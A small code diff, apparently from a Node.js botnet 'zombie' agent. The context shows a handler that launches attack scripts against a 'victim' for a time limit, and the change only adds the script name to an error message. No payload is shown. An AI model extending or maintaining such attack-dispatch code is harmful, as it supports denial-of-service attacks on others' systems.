@@ -130,7 +130,7 @@ settingIntegrity.on('true', () => {
                             res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                         } else {
                             console.log("DOES NOT exist:", methodfilename);
-                            res.send(500, { error: {code: "SCRIPT_NOT_INSTALLED", message: "Script is not installed on the machine."} })
+                            res.send(500, { error: {code: "SCRIPT_NOT_INSTALLED", message: `Script is not installed on the machine.${methodfilename}` } })
                         }
                     })
                     .catch(err => {
